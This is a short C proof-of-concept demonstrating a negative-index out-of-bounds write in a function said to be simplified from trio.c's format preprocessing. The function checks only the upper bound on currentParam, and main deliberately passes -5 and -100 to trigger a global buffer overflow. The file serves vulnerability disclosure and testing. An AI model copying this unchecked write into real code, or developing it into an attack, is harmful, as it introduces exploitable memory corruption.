// PoC for TrioPreprocess negative index vulnerability
// Vulnerability: No lower bound check on currentParam

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define MAX_PARAMETERS 64

typedef struct {
    int type;
    int flags;
} Parameter;

// Global arrays (simplified from trio.c)
int indices[MAX_PARAMETERS];
Parameter parameters[MAX_PARAMETERS];

// Vulnerable function (simplified from trio.c:844-1197)
void process_format_vulnerable(int currentParam, int pos) {
    printf("[*] currentParam = %d, pos = %d\n", currentParam, pos);

    // Only upper bound check - NO lower bound check!
    if (currentParam >= MAX_PARAMETERS) {
        printf("[!] Error: currentParam >= MAX_PARAMETERS\n");
        return;
    }

    // Vulnerable write - negative index allowed!
    printf("[+] Writing to indices[%d] = %d\n", currentParam, pos);
    indices[currentParam] = pos;

    printf("[+] Address of indices[0]: %p\n", &indices[0]);
    printf("[+] Address of indices[%d]: %p\n", currentParam, &indices[currentParam]);
    printf("[+] Offset from indices[0]: %ld bytes\n",
           (long)((char*)&indices[currentParam] - (char*)&indices[0]));
}

int main() {
    printf("=== PoC: TrioPreprocess Negative Index Vulnerability ===\n\n");

    // Initialize arrays
    memset(indices, 0, sizeof(indices));
    memset(parameters, 0, sizeof(parameters));

    printf("[*] indices array: %p - %p (%lu bytes)\n",
           indices, (void*)((char*)indices + sizeof(indices)), sizeof(indices));
    printf("[*] parameters array: %p - %p (%lu bytes)\n\n",
           parameters, (void*)((char*)parameters + sizeof(parameters)), sizeof(parameters));

    // Test 1: Normal case
    printf("[*] Test 1: Normal currentParam=5\n");
    process_format_vulnerable(5, 10);

    // Test 2: Boundary case
    printf("\n[*] Test 2: Boundary currentParam=63 (MAX-1)\n");
    process_format_vulnerable(63, 20);

    // Test 3: Negative index - THIS SHOULD TRIGGER ASAN
    printf("\n[*] Test 3: NEGATIVE INDEX currentParam=-5\n");
    process_format_vulnerable(-5, 30);

    // Test 4: Large negative index
    printf("\n[*] Test 4: LARGE NEGATIVE INDEX currentParam=-100\n");
    process_format_vulnerable(-100, 40);

    printf("\n[!] If ASAN is enabled, you should see global-buffer-overflow in Test 3 and 4\n");

    return 0;
}
